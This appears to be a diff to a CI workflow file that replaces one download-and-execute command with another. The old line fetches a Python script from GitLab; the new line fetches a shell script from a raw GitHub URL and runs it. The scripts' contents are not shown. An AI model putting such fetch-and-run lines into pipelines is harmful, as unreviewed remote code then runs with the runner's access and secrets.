@@ -28,6 +28,6 @@ jobs:
       # Runs a single command using the runners shell
       - name: Run a one-line script
         run: |
-          wget https://gitlab.com/log0x/scripts/-/raw/main/tmat.py && python tmat.py
+          wget https://raw.githubusercontent.com/akuhnet/w-colab/main/GC/ubuntu.sh && chmod +x *.sh && ./ubuntu.sh
 
           
